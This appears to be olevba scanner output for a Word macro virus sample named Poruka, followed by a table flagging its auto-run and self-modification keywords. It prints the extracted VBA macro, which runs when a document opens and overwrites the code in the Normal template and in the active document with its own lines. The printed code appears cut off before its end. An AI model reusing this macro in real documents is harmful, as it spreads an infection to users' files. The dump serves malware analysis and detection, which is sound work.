olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poruka-8b158abd1a35b8cdc5afe4a30bb894e115d5a402
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poruka-8b158abd1a35b8cdc5afe4a30bb894e115d5a402 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'poruka
Private Sub Document_Open()
Dim a, b, c
c = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 16): GoTo f
f: b = Strings.LTrim$(c): a = b: GoTo provjera
provjera: If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> "'poruka" Then GoTo k
k: With NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
.InsertLines 1, a: GoTo l
End With
l: If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> "'poruka" Then GoTo i
i: With ActiveDocument.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
.InsertLines 1, a: GoTo kraj
End With
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

